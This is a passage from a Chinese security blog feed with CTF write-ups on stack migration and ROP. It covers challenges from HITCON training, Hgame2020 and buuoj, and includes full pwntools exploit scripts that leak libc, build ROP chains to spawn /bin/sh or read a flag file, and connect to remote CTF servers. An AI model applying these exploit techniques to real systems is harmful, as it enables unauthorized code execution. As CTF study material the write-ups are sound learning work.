。且leave一般紧跟着就是ret。<strong>因此，在存在栈溢出的程序中，只要我们能控制到栈中的ebp，我们就可以通过两次leave劫持栈。</strong></p><p><img src="http://qiqianyun.chumen77.xyz/15813373484321.jpg" srcset="/img/loading.gif" alt="-w533"><br>第一次随着程序流<code>leave; ret</code>，new esp为我们构造新栈的目标地址。 可以看到执行到ret时，esp还在原来的old栈上，而ebp已经指向了新的栈的栈顶。<br><img src="https://s2.ax1x.com/2020/02/11/1ovtYT.jpg" srcset="/img/loading.gif" alt="1ovtYT.jpg"><br>第二次进入我们放入栈上的<code>leave; ret</code> 的gadget（<strong>这个是我们事先写上栈的</strong>）esp已经被成功劫持到新的栈上，执行完gadget后栈顶会 在new_esp-4(64位是-8)的位置上。此时栈完全可控了，通过预先或者之后在new stack上布置的rop链可以轻松完成攻击。<br><img src="https://s2.ax1x.com/2020/02/11/1oxKN6.png" srcset="/img/loading.gif" alt="1oxKN6.png"><br><img src="https://s2.ax1x.com/2020/02/11/1ovjXj.png" srcset="/img/loading.gif" alt="1ovjXj.png"></p><h3 id="HITCON-training-lab6-64位"><a href="#HITCON-training-lab6-64位" class="headerlink" title="HITCON_training_lab6_64位"></a>HITCON_training_lab6_64位</h3><p>这个是在HITCON_training的一个练习，直接给的有源码，我给编译成了64位版本。</p><h4 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h4><pre><code>#include &lt;stdio.h&gt;int count = 1337 ;char *t= &quot;Z\xc3&quot; ;int main(){if( count!=1337 ){    _exit(1);}count++ ;char buf[48];setvbuf(stdout,0,2,0);puts(&quot;Try your best : &quot; );read(0, buf,128);return ;}</code></pre><p><code>gcc  -z relro -z now -fno-stack-protector -mpreferred-stack-boundary=2 migration.c -o migration</code> 编译命令</p><h4 id="简单分析"><a href="#简单分析" class="headerlink" title="简单分析"></a>简单分析</h4><p>这个题纯粹就是为了练习的Stack Migration用的，可以不分析代码直接用gdb-peda直接来测试：<br><img src="http://qiqianyun.chumen77.xyz/15813398610900.jpg" srcset="/img/loading.gif" alt="-w332"><br><img src="http://qiqianyun.chumen77.xyz/15813398926858.jpg" srcset="/img/loading.gif" alt="-w955"><br>熟悉的栈溢出，但是下面多出来的一些字符串，也是程序不能接受的部分，也可以作为一个需要考虑栈迁移的标志。<br><img src="https://s2.ax1x.com/2020/02/11/1og2r9.jpg" srcset="/img/loading.gif" alt="1og2r9.jpg"><br>注意一下rsp被覆盖的值。<br><img src="https://s2.ax1x.com/2020/02/11/1ogs8U.jpg" srcset="/img/loading.gif" alt="1ogs8U.jpg"><br>计算padding为48.<br><img src="https://s2.ax1x.com/2020/02/11/1ogwEq.jpg" srcset="/img/loading.gif" alt="1ogwEq.jpg"><br>计算一下，可以填入多少的可控字段。去除一下刚刚程序不能存入的部分和padding部分，还有80个字节可以用。其中一个来伪造new esp，剩下也就还有9个gadget可以用，可以给我构造第一个rop链。</p><h4 id="图解分析"><a href="#图解分析" class="headerlink" title="图解分析"></a>图解分析</h4><p>假设我们已经填入了溢出字符，buf1即为我们要去的新栈，这个选择bss段的后一半：<br><img src="https://s2.ax1x.com/2020/02/11/1ogabn.jpg" srcset="/img/loading.gif" alt="1ogabn.jpg"><br>开始执行一下leave 中的<code>mov rsp,rbp</code>：<br><img src="https://s2.ax1x.com/2020/02/11/1ogUDs.jpg" srcset="/img/loading.gif" alt="1ogUDs.jpg"><br>此时rsp 也指向了 rbp指向的位置，在执行leave中的<code>pop rbp</code>:<br><img src="https://s2.ax1x.com/2020/02/11/1ocMfU.jpg" srcset="/img/loading.gif" alt="1ocMfU.jpg"><br>此时rbp已经到了我们伪造的新栈buf1，然后开始执行ret,进入执行pop_rdi的gadget:<br><img src="https://s2.ax1x.com/2020/02/11/1ocZmn.jpg" srcset="/img/loading.gif" alt="1ocZmn.jpg"><br><img src="https://s2.ax1x.com/2020/02/11/1ocklQ.jpg" srcset="/img/loading.gif" alt="1ocklQ.jpg"></p><p>此时已经将buf1的地址，推入rdi，作为gets的参数，执行gets函数后，我们就可以往buf1上填入我们的rop链，此时栈大小已经没有限制了，可以任意写。<br><img src="https://s2.ax1x.com/2020/02/11/1o6oo6.jpg" srcset="/img/loading.gif" alt="1o6oo6.jpg"><br><img src="https://s2.ax1x.com/2020/02/11/1o6gWF.jpg" srcset="/img/loading.gif" alt="1o6gWF.jpg"><br>在这个buf1的栈空间里，我们需要先把rbp指向的位置写入buf2（下一个构造的新栈），然后构造rop链把puts的内存地址给泄露出来，进而可以算出libc的基地址，接着再构造一个gets函数。接着是执行一下leave 的gadget：<br><img src="https://s2.ax1x.com/2020/02/11/1o60Ln.jpg" srcset="/img/loading.gif" alt="1o60Ln.jpg"><br><img src="https://s2.ax1x.com/2020/02/11/1o6NRg.jpg" srcset="/img/loading.gif" alt="1o6NRg.jpg"><br>执行完以后就可以发现我们，已经完全控制了栈。并且开了一个buf2的新栈，留着在buf1调用gets函数时来在buf2新栈中摆上调用system(/bin/sh)函数的rop链。然后继续执行：<br><img src="https://s2.ax1x.com/2020/02/11/1o6tJS.jpg" srcset="/img/loading.gif" alt="1o6tJS.jpg"><br><img src="https://s2.ax1x.com/2020/02/11/1o6Yi8.jpg" srcset="/img/loading.gif" alt="1o6Yi8.jpg"><br>这就泄露出了puts函数的内存地址。接着开始往buf2新栈上读rop链:<br><img src="https://s2.ax1x.com/2020/02/11/1o6lqI.jpg" srcset="/img/loading.gif" alt="1o6lqI.jpg"><br><img src="https://s2.ax1x.com/2020/02/11/1o6QsA.jpg" srcset="/img/loading.gif" alt="1o6QsA.jpg"><br><img src="https://s2.ax1x.com/2020/02/11/1o6VIK.jpg" srcset="/img/loading.gif" alt="1o6VIK.jpg"><br>读入完成，接着再次执行leave的gadget：<br><img src="https://s2.ax1x.com/2020/02/11/1o6AVx.jpg" srcset="/img/loading.gif" alt="1o6AVx.jpg"><br><img src="https://s2.ax1x.com/2020/02/11/1oyk4S.jpg" srcset="/img/loading.gif" alt="1oyk4S.jpg"><br>可以看到esp到了新栈，rbp因为刚刚在buf2填入的buf1，又会到了buf1，这个地址可以随便填了，对做题不影响，填写这个只是可以看到再次栈转移。接着执行buf2新栈的rop链：<br><img src="https://s2.ax1x.com/2020/02/11/1os600.jpg" srcset="/img/loading.gif" alt="1os600.jpg"><br>就可以拿到shell了。</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>借着这个思路就可以开始写exp:</p><pre><code>from pwn import *import timecontext.arch = &#39;amd64&#39;context.log_level = &#39;debug&#39;e = ELF(&#39;./test&#39;)l = ELF(&#39;/lib/x86_64-linux-gnu/libc-2.23.so&#39;) # io = remote(&#39;127.0.0.1&#39;,4000)io = process(&#39;./test&#39;)pop_rdi_ret = 0x400703pop_rsi_r15_ret= 0x0400701pop_rdx_ret= 0x0400724leave_ret= 0x0400699buf1 = 0x00602000 - 0x200buf2 = buf1 + 0x100padding = 56 - 8puts_plt = e.symbols[&#39;puts&#39;]puts_got = e.got[&#39;puts&#39;]read_add = e.symbols[&#39;read&#39;]io.recvuntil(&#39;:&#39;)p = &#39;a&#39;*padding + flat([buf1,pop_rdi_ret,0,pop_rsi_r15_ret,buf1,0,pop_rdx_ret,0x100,read_add,leave_ret])#raw_input(&#39;-&gt;&#39;)io.send(p)sleep(0.1)p = flat([buf2,pop_rdi_ret,puts_got,puts_plt,pop_rdi_ret,0,pop_rsi_r15_ret,buf2,0,pop_rdx_ret,0x100,read_add,leave_ret])sleep(0.1)#raw_input(&#39;-&gt;&#39;)io.sendline(p)io.recvuntil(&#39;\n&#39;)puts = u64((io.recv(6)).ljust(8,&#39;\x00&#39;))libc = puts - l.symbols[&#39;puts&#39;]print(&#39;libc_base:&#39; + hex(libc))binsh_add = l.search(&#39;/bin/sh\x00&#39;).next() + libc#print(binsh_add)# raw_input(&#39;-&gt;&#39;)system_add = l.symbols[&#39;system&#39;] + libcp = flat([buf1,pop_rdi_ret,binsh_add,system_add])sleep(0.1)io.sendline(p)io.interactive()</code></pre><h3 id="Hgame2020-week2-rop-level2"><a href="#Hgame2020-week2-rop-level2" class="headerlink" title="Hgame2020_week2_rop_level2"></a>Hgame2020_week2_rop_level2</h3><h4 id="查保护和arch-1"><a href="#查保护和arch-1" class="headerlink" title="查保护和arch"></a>查保护和arch</h4><p><img src="https://s2.ax1x.com/2020/02/11/1os8OI.jpg" srcset="/img/loading.gif" alt="1os8OI.jpg"><br>32位程序，开了nx保护</p><h4 id="ida分析-2"><a href="#ida分析-2" class="headerlink" title="ida分析"></a>ida分析</h4><p><img src="https://s2.ax1x.com/2020/02/11/1osEO1.md.jpg" srcset="/img/loading.gif" alt="1osEO1.md.jpg"><br>这个明显的栈溢出，但是0x60-0x50-0x8 = 8。发现只有一个gadget位置，无法构造我们想要的rop链。但是前面的第一个read函数，可以读入很大空间，并且第二个参数buf的地址是固定的。<br><img src="https://s2.ax1x.com/2020/02/11/1orMMn.jpg" srcset="/img/loading.gif" alt="1orMMn.jpg"><br>那这个题明显就是可以Stack Migration来解决问题了，并且只需再写一个leave ret就控制栈了。</p><h5 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h5><p>程序中有着open，read，puts函数，我们可以写一个rop链，调用open函数，控制其参数是<code>./flag</code>，并在gdb中调试将其返回的文件fd号记录下来，然后传递给read函数，让其读入文件内容存入某个缓冲区，再用puts函数输出一下flag文件的内容即可。在第一个read的时候，我们就需要写好rop链。然后在最后一个read函数时，控制好ebp指向我们的新栈。</p><h4 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h4><pre><code>from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;amd64&#39;# io = process(&#39;./ROP&#39;)io = remote(&#39;47.103.214.163&#39;,20300)e = ELF(&#39;./ROP&#39;)buf = 0x06010A0# libc = e.libcpadding = 80leave_ret = 0x040090dpop_rdi_ret = 0x00400a43pop_rsi_r15 = 0x00400a41open_plt = 0x4007b0read_plt = 0x400780puts_plt = 0x400760io.recvuntil(&#39;think so?\n&#39;)p = flat([&#39;./flag\x00\x00&#39;,pop_rdi_ret,buf,pop_rsi_r15,0,0,open_plt,pop_rdi_ret,4,pop_rsi_r15,buf+0x80,0,read_plt,pop_rdi_ret,buf+0x80,puts_plt])io.sendline(p)io.recvuntil(&#39;\n&#39;)p = padding * &#39;a&#39; + p64(buf) + p64(leave_ret)raw_input(&#39;-&gt;&#39;) #手动下一个断点，以后让gdb附加上进行调试io.send(p)flag = io.recvline_contains(&#39;hgame&#39;)print(flag)io.interactive()</code></pre><p>我们跟着exp来调试一下，看看效果：<br><img src="https://s2.ax1x.com/2020/02/11/1or3ZV.jpg" srcset="/img/loading.gif" alt="1or3ZV.jpg"><br>此时的esp是我们伪造的new esp，已经指向了我们的目标位置，并且第一个rop链接已经送过去，可以看到<code>./flag</code>的字眼。执行一下leave：<br><img src="https://s2.ax1x.com/2020/02/11/1orGIU.jpg" srcset="/img/loading.gif" alt="1orGIU.jpg"><br>可以看到rbp的值已经等于我们伪造的值，esp还在原来栈上。接着执行ret，进入下一个leave ret：<br><img src="https://s2.ax1x.com/2020/02/11/1orQrq.jpg" srcset="/img/loading.gif" alt="1orQrq.jpg"><br>先记录下当前的状态，开始执行leave：<br><img src="https://s2.ax1x.com/2020/02/11/1or8aT.jpg" srcset="/img/loading.gif" alt="1or8aT.jpg"><br>执行完发现esp已经到达了新栈buf+8的位置，此时的栈帧已经是我们完全想要的，已经劫持了程序流程，并且新栈空间很大，可以满足我们的需求。ebp是多少已经不重要了，我们直接填入<code>./flag</code>，这个固定地址也做为给open函数做参数。<br><img src="https://s2.ax1x.com/2020/02/11/1ormGQ.jpg" srcset="/img/loading.gif" alt="1ormGQ.jpg"><br>在调试的时候，执行完open函数需要把返回的fd值记录下，给read函数做参数。最后由puts函数在输出flag：<br><img src="https://s2.ax1x.com/2020/02/11/1oDzPe.jpg" srcset="/img/loading.gif" alt="1oDzPe.jpg"></p><h3 id="Stack-Migration小总结"><a href="#Stack-Migration小总结" class="headerlink" title="Stack Migration小总结"></a>Stack Migration小总结</h3><p> 这下可以总结下利用思路也就是</p><ul><li>把控好起初栈的ebp，在里面写入需要伪造的new esp</li><li>在之后的可利用字节中写入leave gadget</li><li>将想执行的ROP Chain写在已知固定位置上</li><li>再利用leave搬移Stack位置到已知位置</li><li>然后无限接ROP Chain</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>学习记录</tag>
      
      <tag>Stack Migration</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ROP题目练习</title>
    <link href="/2020/02/03/ROP%E7%BB%83%E4%B9%A0/"/>
    <url>/2020/02/03/ROP%E7%BB%83%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="ROP题目练习"><a href="#ROP题目练习" class="headerlink" title="ROP题目练习"></a>ROP题目练习</h1><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在学习栈溢出，做了一些ROP的练习题，基本都是buuoj的题目，搜索rop字眼找的rop题。简单记录一下收获和exp。</p><h1 id="有libc（或者无libc可做）"><a href="#有libc（或者无libc可做）" class="headerlink" title="有libc（或者无libc可做）"></a>有libc（或者无libc可做）</h1><h2 id="OGeek2019-babyrop"><a href="#OGeek2019-babyrop" class="headerlink" title="OGeek2019_babyrop"></a>OGeek2019_babyrop</h2><h3 id="查保护和arch"><a href="#查保护和arch" class="headerlink" title="查保护和arch"></a>查保护和arch</h3><p><img src="/2020/02/03/ROP练习/images/15807186229840.jpg" srcset="/img/loading.gif" alt="-w621"><br>32位程序，开启NX堆栈不可执行。</p><h3 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h3><p><img src="/2020/02/03/ROP练习/images/15807186890200.jpg" srcset="/img/loading.gif" alt="-w373"><br>可以看出其取了一个随机数，存入buf。<br><img src="/2020/02/03/ROP练习/images/15807187726931.jpg" srcset="/img/loading.gif" alt="-w413"><br>然后进入这个函数分析，看到接收buf传来的值，放入s中。然后下面接收你传入的东西，与s判断是否相同，不相同就会退出。然后如果不退出返回值是v5，但是这里的v5在函数中是没有经过处理的。看一下汇编：<br><img src="/2020/02/03/ROP练习/images/15807191082469.jpg" srcset="/img/loading.gif" alt="-w508"><br>v5咱们想控制，就只能通过原来那个read函数，咱们传入的值去控制。返回值给v2，然后v2作为参数然后进入下面这个带有溢出的函数中。<br> <img src="/2020/02/03/ROP练习/images/15807191871406.jpg" srcset="/img/loading.gif" alt="-w375"><br>观察后，可以看出咱们应该把这个返回的参数整的大一点，方便进行写ROP链。</p><h4 id="分析总结"><a href="#分析总结" class="headerlink" title="分析总结"></a>分析总结</h4><p>其中对于绕过相等判断，可以利用一下strlen函数的特性，然后直接用<code>\x00</code>来截断。<br>v5这个返回参数可以控制为’\xff’,然后进入带有溢出的函数，写rop链就行了。<br>先用puts函数泄露出<code>__libc_start_main</code>的地址，然后在给的libc中确认下symbols，然后拿到libc基址，然后直接利用one gadget RCE即可。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import time# io = process(&#39;./pwn&#39;)io = remote(&#39;node3.buuoj.cn&#39;,27780)libc = ELF(&#39;./libc-2.23.so&#39;)# blibc = ELF(&#39;/lib/i386-linux-gnu/libc-2.23.so&#39;)elf = ELF(&#39;./pwn&#39;)# raw_input(&#39;-&gt;&#39;)p1 = &#39;\x00&#39;.ljust(8,&#39;\xff&#39;) offset = 0xe7 + 4io.send(p1 + &#39;\n&#39;)io.recvline_contains(&#39;Correct&#39;)start_add=0x080485A0put_add = elf.symbols[&#39;puts&#39;]libc_start_add = elf.got[&#39;__libc_start_main&#39;]rop1 = [    put_add,    start_add,    libc_start_add]p2 = offset * &#39;\x00&#39; + &#39;&#39;.join(map(p32,rop1))io.sendline(p2)sleep(1)libc_base = u32(io.recv(4)) - libc.symbols[&#39;__libc_start_main&#39;]REC = libc_base+0x3a80cprint(&#39;libc_base :&#39;+hex(libc_base))offset = 0xe7 + 4io.send(p1 + &#39;\n&#39;)io.recvline_contains(&#39;Correct&#39;)p3 = offset * &#39;\x00&#39; + p32(REC)io.sendline(p3)io.interactive()</code></pre><h2 id="HarekazeCTF2019-baby-rop"><a href="#HarekazeCTF2019-baby-rop" class="headerlink" title="HarekazeCTF2019_baby_rop"></a>HarekazeCTF2019_baby_rop</h2><h3 id="查保护和arch-1"><a href="#查保护和arch-1" class="headerlink" title="查保护和arch"></a>查保护和arch</h3><p><img src="/2020/02/03/ROP练习/images/15807395869628.jpg" srcset="/img/loading.gif" alt="-w624"></p><h3 id="ida分析-1"><a href="#ida分析-1" class="headerlink" title="ida分析"></a>ida分析</h3><pre><code>int __cdecl main(int argc, const char **argv, const char **envp){  char v4; // [rsp+0h] [rbp-10h]  system(&quot;echo -n \&quot;What&#39;s your name? \&quot;&quot;);  __isoc99_scanf(&quot;%s&quot;, &amp;v4);  printf(&quot;Welcome to the Pwn World, %s!\n&quot;, &amp;v4);  return 0;}</code></pre><p>程序十分简单，给了system函数，且明显存在溢出。<br><img src="/2020/02/03/ROP练习/images/15807396970009.jpg" srcset="/img/loading.gif" alt="-w502"><br>ida查看字符串，该可以发现<code>/bin/sh</code>/，这构造个简单rop链直接利用就好了。</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre><code>from pwn import *import time# io = process(&#39;./babyrop&#39;)io = remote(&#39;node3.buuoj.cn&#39;,28633)elf = ELF(&#39;./babyrop&#39;)offset = 0x10 + 8binsh_add = 0x0601048pop_rdi_ret=0x000400683 system_add = elf.symbols[&#39;system&#39;]# io.recvline_contains(&#39;your&#39;)# raw_input(&#39;-&gt;&#39;)p = &#39;a&#39; * offset + p64(pop_rdi_ret) + p64(binsh_add) + p64(system_add)io.sendline(p)io.interactive()</code></pre><p>拿到shell后，这个题buuctf根目录下没有flag文件。需要<code>find / -name &quot;flag&quot;</code> 可以查到是在<code>/home/babyrop/flag</code>这个目录下。</p><h2 id="HarekazeCTF2019-baby-rop2"><a href="#HarekazeCTF2019-baby-rop2" class="headerlink" title="HarekazeCTF2019_baby_rop2"></a>HarekazeCTF2019_baby_rop2</h2><h3 id="查保护和arch-2"><a href="#查保护和arch-2" class="headerlink" title="查保护和arch"></a>查保护和arch</h3><p><img src="/2020/02/03/ROP练习/images/15808200972779.jpg" srcset="/img/loading.gif" alt="-w310"></p><h3 id="ida分析-2"><a href="#ida分析-2" class="headerlink" title="ida分析"></a>ida分析</h3><p><img src="/2020/02/03/ROP练习/images/15808200578822.jpg" srcset="/img/loading.gif" alt="-w577"><br>函数过程很简单，明显栈溢出，思路就是先栈溢出构造rop链，让pintf函数打印出<code>__libc_start_main</code>函数在内存的地址，然后在给的libc文件中获取一下其sympol是的值，然后再计算出它的基址，再让函数返回到shart处清理一下栈，然后再次利用onegadget RCE构造相关rop链即可。</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><pre><code>from pwn import *import timeio = process(&#39;./babyrop2&#39;)# blibc = ELF(&#39;/lib/x86_64-linux-gnu/libc-2.23.so&#39;)# context.log_level = &#39;debug&#39;libc = ELF(&#39;./libc.so.6&#39;)io = remote(&#39;node3.buuoj.cn&#39;,27694)elf = ELF(&#39;./babyrop2&#39;)offset = 40__libc_start_add = elf.got[&#39;__libc_start_main&#39;]start_add = 0x0400540 printf_add = elf.symbols[&#39;printf&#39;]aWelcomeToThePw = 0x400770 pop_rdi_ret= 0x000400733pop_rsi_r15_ret = 0x00400731 libc_start_sys = libc.symbols[&#39;__libc_start_main&#39;]rop1 = [    pop_rdi_ret,    aWelcomeToThePw,    pop_rsi_r15_ret,    __libc_start_add,    0,    printf_add,    start_add]io.recvuntil(&#39;e? &#39;)# io.recvuntil(&#39;again, &#39;)# raw_input(&#39;-&gt;&#39;)p = &#39;a&#39; * offset + &#39;&#39;.join(map(p64,rop1))io.sendline(p)io.recvline_contains(&#39;again&#39;)s = io.recvline_contains(&#39;again&#39;)libc_base = int(u64(s[32:38].ljust(8,&#39;\x00&#39;))) - libc_start_sysRCE = libc_base + 0x4526aprint(&#39;libc_base:&#39;+hex(libc_base))io.recvuntil(&#39;name? &#39;)# io.recvuntil(&#39;name? &#39;)p = &#39;\x00&#39; * offset + p64(RCE) + &#39;\x00&#39; * 70sleep(1)raw_input(&#39;-&gt;&#39;)io.sendline(p)io.interactive()</code></pre><h1 id="无libc"><a href="#无libc" class="headerlink" title="无libc"></a>无libc</h1><p>这一部分目前主要是利用LibcSearcher来做的，有时候题目不给libc，用这个也可以解决部分题目。~~用这个以后就不能很方便的用onegadget去一键拿shell了，感觉还是有办法的，想办法拿到LibcSearcher获取到的libc版本就好了，找个时间去实践一下，先慢慢构建rop链就好，正好练习一下这种方法拿shell。~~<br>已经测试出办法咯。<br><code>https://github.com/lieanu/LibcSearcher</code></p><h2 id="bjdctf-2020-babyrop"><a href="#bjdctf-2020-babyrop" class="headerlink" title="bjdctf_2020_babyrop"></a>bjdctf_2020_babyrop</h2><h3 id="查保护和arch-3"><a href="#查保护和arch-3" class="headerlink" title="查保护和arch"></a>查保护和arch</h3><p><img src="/2020/02/03/ROP练习/images/15808195388315.jpg" srcset="/img/loading.gif" alt="-w408"></p><h3 id="ida分析-3"><a href="#ida分析-3" class="headerlink" title="ida分析"></a>ida分析</h3><p><img src="/2020/02/03/ROP练习/images/15808195745508.jpg" srcset="/img/loading.gif" alt="-w436"><br>函数十分简单，明显栈溢出，思路就是先栈溢出构造rop链，让puts函数打印出<code>__libc_start_main</code>函数的地址，然后再用libcsearcher来获取一下它的libc版本，然后再计算出它的基址，再让函数返回到最初清理一下栈，然后再次进行溢出构造关于<code>system(&#39;/bin/sh&#39;)</code>的rop链即可。</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><pre><code>from pwn import *from LibcSearcher import *import time# context.log_level = &#39;debug&#39;io = remote(&#39;node3.buuoj.cn&#39;,28661)# io = process(&#39;./bjdctf_2020_babyrop&#39;)elf = ELF(&#39;./bjdctf_2020_babyrop&#39;)# blibc = ELF(&#39;/lib/x86_64-linux-gnu/libc-2.23.so&#39;)io.recvuntil(&#39;story!\n&#39;)padding = 40libc_main_add = elf.got[&#39;__libc_start_main&#39;]puts_add = elf.symbols[&#39;puts&#39;]pop_rdi_ret = 0x0400733 p = &#39;a&#39;*padding + p64(pop_rdi_ret) + p64(libc_main_add) + p64(puts_add) + p64(0x400530)io.sendline(p)s = u64(io.recv(6).ljust(8,&#39;\x00&#39;))print(hex(s))obj = LibcSearcher(&quot;__libc_start_main&quot;,s)libc_base = s - obj.dump(&quot;__libc_start_main&quot;)system_add = libc_base + obj.dump(&quot;system&quot;)binsh_add = libc_base + obj.dump(&quot;str_bin_sh&quot;)sleep(1)io.recvuntil(&#39;story!\n&#39;)p = &#39;a&#39;*padding + p64(pop_rdi_ret) + p64(binsh_add) + p64(system_add)io.sendline(p)io.interactive()</code></pre><h2 id="unctf-easyrop"><a href="#unctf-easyrop" class="headerlink" title="unctf_easyrop"></a>unctf_easyrop</h2><h3 id="查保护和arch-4"><a href="#查保护和arch-4" class="headerlink" title="查保护和arch"></a>查保护和arch</h3><p><img src="/2020/02/03/ROP练习/images/15808809043718.jpg" srcset="/img/loading.gif" alt="-w432"></p><h3 id="ida分析-4"><a href="#ida分析-4" class="headerlink" title="ida分析"></a>ida分析</h3><p><img src="/2020/02/03/ROP练习/images/15808809641958.jpg" srcset="/img/loading.gif" alt="-w397"><br>主程序主要就是限制了v2需要等于<code>ffff</code>才能进入带有溢出的函数，v2的值是<br><img src="/2020/02/03/ROP练习/images/15808810282809.jpg" srcset="/img/loading.gif" alt="-w381"><br>这个在read的时候把控好，让ffff填入这个位置即可。<br><img src="/2020/02/03/ROP练习/images/15808811265759.jpg" srcset="/img/loading.gif" alt="-w407"><br>然后进入这个带有溢出漏洞的函数，可以看到buf的首地址是<code>ebp-0x10</code>，<img src="/2020/02/03/ROP练习/images/15808812877029.jpg" srcset="/img/loading.gif" alt="-w478"><br>然后分析下这里的汇编，它把read函数的溢出位置返回值<code>ebp-0x14</code>取出来，与<code>0x8050000</code>进行比较。<br><img src="/2020/02/03/ROP练习/images/15808814707476.jpg" srcset="/img/loading.gif" alt="-w385"><br>也可以看出，这里是防止我们进行ret2libc的。那我们构造这里可以用一个ret来进行绕过。</p><h4 id="思路总结"><a href="#思路总结" class="headerlink" title="思路总结"></a>思路总结</h4><p>先控制好v2让其等于<code>ffff</code>，然后进入带有溢出的函数，然后构造rop链，先把<code>__libc_start_main</code>的内存地址泄露出来，然后用libcseacher来确定libc版本，<br>然后dump出<code>__libc_start_main的sympols</code>,算出基址后，接着返回到开始处清理一下栈，再次溢出跟原来一样。然后再次构造rop链的时候，注意ret绕过对咱们溢出地址的检测，在调用system(‘/bin/sh’)即可。</p><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><pre><code>from pwn import *from LibcSearcher import *import time# context.log_level = &#39;debug&#39;io = process(&#39;./easyrop&#39;)# io = remote(&#39;183.129.189.60&#39;,10011)io.recvuntil(&#39;TFer!\n&#39;)e =ELF(&#39;./easyrop&#39;)raw_input(&#39;-&gt;&#39;)padding = 36start_add = 0x08048400libc_start_main = e.got[&#39;__libc_start_main&#39;]puts_add = e.symbols[&#39;puts&#39;]ret = 0x0804839ep = &#39;f&#39; * paddingrop1 = [    puts_add,    start_add,    libc_start_main]io.sendline(p)io.recvuntil(&#39;name?\n&#39;)p = &#39;\x00&#39; * 0x18 + &#39;&#39;.join(map(p32,rop1))raw_input(&#39;&gt;&#39;)io.sendline(p)libc_start_add = u32(io.recv(4))obj = LibcSearcher(&quot;__libc_start_main&quot;,libc_start_add)libc_base = libc_start_add - obj.dump(&quot;__libc_start_main&quot;)print(libc_base)system_add = obj.dump(&#39;system&#39;) + libc_basebinsh_add = obj.dump(&#39;str_bin_sh&#39;) + libc_baseio.recvuntil(&#39;TFer!\n&#39;)p = &#39;f&#39; * paddingio.sendline(p)io.recvuntil(&#39;name?\n&#39;)rop2 = [    ret,    system_add,    start_add,    binsh_add]p = &#39;\x00&#39; * 0x14 + &#39;&#39;.join(map(p32,rop2))sleep(1)io.sendline(p)io.interactive()</code></pre><h2 id="铁人三项-第五赛区-2018-rop"><a href="#铁人三项-第五赛区-2018-rop" class="headerlink" title="铁人三项(第五赛区)_2018_rop"></a>铁人三项(第五赛区)_2018_rop</h2><h3 id="查保护和arch-5"><a href="#查保护和arch-5" class="headerlink" title="查保护和arch"></a>查保护和arch</h3><p><img src="/2020/02/03/ROP练习/images/15813386440906.jpg" srcset="/img/loading.gif" alt="-w512"><br>32位</p><h3 id="ida分析-5"><a href="#ida分析-5" class="headerlink" title="ida分析"></a>ida分析</h3><pre><code>int __cdecl main(int argc, const char **argv, const char **envp){  be_nice_to_people();  vulnerable_function();  return write(1, &quot;Hello, World\n&quot;, 0xDu);}</code></pre><p>主函数很简单，漏洞函数是在第二个函数。<br><img src="/2020/02/03/ROP练习/images/15813387437739.jpg" srcset="/img/loading.gif" alt="-w344"><br>栈溢出，然后直接构造rop链即可。<br><img src="/2020/02/03/ROP练习/images/15813388677907.jpg" srcset="/img/loading.gif" alt="-w322"><br>利用思路：用wirte函数泄露出<code>__libc_start_main</code>在内存地址，然后返回start清理一下栈，用libcseacher确定下libc版本，然后进行构造system(‘/bin/sh’)的rop链即可。</p><p>这个我是发现可以用libcseacher确定libc版本后，用one_gadget工具计算RCE位置，然后实现ret to RCE。libcseacher获取到leak地址后，在执行dump libc前的时候，会告诉你，它确定的libc版本号是多少。<br><img src="/2020/02/03/ROP练习/images/15813393524855.jpg" srcset="/img/loading.gif" alt="-w1217"><br>这个是让你选择的。<br><img src="/2020/02/03/ROP练习/images/15813394033522.jpg" srcset="/img/loading.gif" alt="-w826"></p><p><img src="/2020/02/03/ROP练习/images/15813392212443.jpg" srcset="/img/loading.gif" alt="-w1200"><br>在下载的libcseacher时候，其实它是有个数据库的，这里面存着各种libc版本，方便咱们使用。那这个时候，直接用one_gadget 计算下RCE偏移即可。<br><img src="/2020/02/03/ROP练习/images/15813395195579.jpg" srcset="/img/loading.gif" alt="-w1030"></p><h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><pre><code>from pwn import *from LibcSearcher import *context.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;elf = ELF(&#39;./2018_rop&#39;)# io = process(&#39;./2018_rop&#39;)io = remote(&#39;node3.buuoj.cn&#39;,29692)padding = 140 write_plt = elf.symbols[&#39;write&#39;]libc_start_main_got = elf.got[&#39;__libc_start_main&#39;]start = 0x080483C0 p = padding * &#39;\x00&#39; + flat([write_plt,start,1,libc_start_main_got,0x10])# raw_input(&#39;-&gt;&#39;)io.sendline(p)libc_start_main_add = u32(io.recv(4))obj = LibcSearcher(&#39;__libc_start_main&#39;,libc_start_main_add)libc_base = libc_start_main_add - obj.dump(&#39;__libc_start_main&#39;)system_add = libc_base + obj.dump(&#39;system&#39;)binsh_add = libc_base + obj.dump(&#39;str_bin_sh&#39;)# print(libc.symbols[&#39;__libc_start_main&#39;])print(hex(libc_base))# io.recvline()RCE = libc_base + 0x3cbecp = padding * &#39;\x00&#39; + p32(RCE) + padding * &#39;\x00&#39;# p = padding * &#39;\x00&#39; + p32(system_add) + p32(start) + p32(binsh_add)io.sendline(p)io.interactive()</code></pre><p>这里面两种办法都行。</p><h2 id="xdctf2015-pwn200"><a href="#xdctf2015-pwn200" class="headerlink" title="xdctf2015_pwn200"></a>xdctf2015_pwn200</h2><h3 id="查保护和arch-6"><a href="#查保护和arch-6" class="headerlink" 